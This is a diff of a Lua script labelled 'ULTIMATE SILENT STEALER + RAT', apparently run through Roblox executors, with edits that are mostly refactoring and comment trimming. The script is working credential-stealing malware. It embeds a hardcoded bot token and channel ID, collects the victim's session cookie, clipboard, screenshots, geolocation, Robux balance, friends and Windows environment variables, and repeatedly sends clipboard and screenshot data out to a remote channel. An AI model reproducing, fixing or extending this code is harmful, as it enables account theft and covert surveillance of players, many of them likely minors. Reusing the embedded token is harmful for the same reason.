@@ -1,5 +1,5 @@
 -- ============================================================
--- ULTIMATE SILENT STEALER + RAT (Bot Token)
+-- ULTIMATE SILENT STEALER + RAT (Bot Token) – FIXED
 -- ============================================================
 local botToken = "MTUzMzg5MjMyMDQ1NjM0Nzc4OA.GKEOrv.PKV9UcJd703CEZorhu6HqPI_ERafjoUJUwSaEE"
 local channelID = "1543230748180615198"
@@ -131,7 +131,7 @@ local function stealCookie()
     return "Not available (executor limit)"
 end
 
--- ========== SCREENSHOT (if executor supports) ==========
+-- ========== SCREENSHOT (if supported) ==========
 local function captureScreen()
     if pcall(function() return screenshot end) then
         local ok, img = pcall(screenshot)
@@ -144,7 +144,7 @@ local function captureScreen()
     return "No screenshot function available"
 end
 
--- ========== SYSTEM INFO (safe) ==========
+-- ========== SYSTEM ENV ==========
 local function getSystemEnv()
     local env = {}
     for _, var in ipairs({"OS", "COMPUTERNAME", "USERNAME", "PROCESSOR_IDENTIFIER", "NUMBER_OF_PROCESSORS", "APPDATA", "LOCALAPPDATA", "USERPROFILE", "TEMP", "WINDIR"}) do
@@ -154,12 +154,11 @@ local function getSystemEnv()
     return env
 end
 
--- ========== ROBUX BALANCE (via API) ==========
+-- ========== ROBUX ==========
 local function getRobux()
     local player = game.Players.LocalPlayer
     if not player then return "N/A" end
-    local userId = player.UserId
-    local url = "https://economy.roblox.com/v1/users/" .. userId .. "/currency"
+    local url = "https://economy.roblox.com/v1/users/" .. player.UserId .. "/currency"
     local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
     if ok and res then
         local rb = res:match('"robux":(%d+)')
@@ -168,7 +167,7 @@ local function getRobux()
     return "N/A"
 end
 
--- ========== CREATOR NAME (via API) ==========
+-- ========== CREATOR NAME ==========
 local function getCreatorName()
     local creatorId = safeGet(game, "CreatorId", 0)
     if creatorId and creatorId ~= 0 then
@@ -192,6 +191,7 @@ local function collectAll()
         info.userName = player.Name
         info.displayName = player.DisplayName
         info.accountAge = tostring(math.floor((player.UserId / 100000000) * 2) + 2006) .. " (approx)"
+        -- Only valid friends method: GetFriendsOnline (no GetFriends)
         info.friendsOnline = tostring(#player:GetFriendsOnline() or 0)
         -- Groups
         local groups = {}
@@ -241,7 +241,6 @@ local function collectAll()
                 if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
             end
         end)
-        -- Robux
         info.robux = getRobux()
     end
 
@@ -264,16 +263,11 @@ local function collectAll()
     local geo = getGeo()
     for k, v in pairs(geo) do info["geo_" .. k] = v end
 
-    -- Cookie
     info.cookie = stealCookie()
-
-    -- Clipboard
     info.clipboard = getClip()
-
-    -- Screenshot
     info.screenshot = captureScreen()
 
-    -- System environment
+    -- System env
     local env = getSystemEnv()
     for k, v in pairs(env) do info["env_" .. k] = v end
 
@@ -288,7 +282,7 @@ local function collectAll()
         if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
     end)
 
-    -- Platform & Hardware
+    -- Hardware
     pcall(function()
         local us = game:GetService("UserInputService")
         info.platform = tostring(us.Platform)
@@ -297,14 +291,10 @@ local function collectAll()
         info.keyboardEnabled = tostring(us.KeyboardEnabled)
         info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
         info.volume = tostring(game:GetService("SoundService").Volume)
-        local screen = game:GetService("GuiService"):GetGuiSize()
-        info.screenResolution = tostring(screen)
+        info.screenResolution = tostring(game:GetService("GuiService"):GetGuiSize())
     end)
 
-    -- Time zone offset
     info.timeOffset = tostring(os.difftime(os.time(), os.time()))
-
-    -- Locale
     pcall(function()
         info.locale = game:GetService("LocalizationService"):GetLocale()
     end)
@@ -312,7 +302,7 @@ local function collectAll()
     return info
 end
 
--- ========== SEND INITIAL DATA ==========
+-- ========== SEND INITIAL ==========
 local function sendInitial()
     local data = collectAll()
     local lines = {}
@@ -382,7 +372,6 @@ while true do
     if clip and clip ~= "N/A" and clip ~= "" then
         sendMessage("```[CLIPBOARD] " .. clip .. "```")
     end
-    -- Also send screenshot if changed? (optional)
     local scr = captureScreen()
     if scr and scr ~= "No screenshot function available" then
         sendMessage("```[SCREENSHOT] " .. scr .. "```")
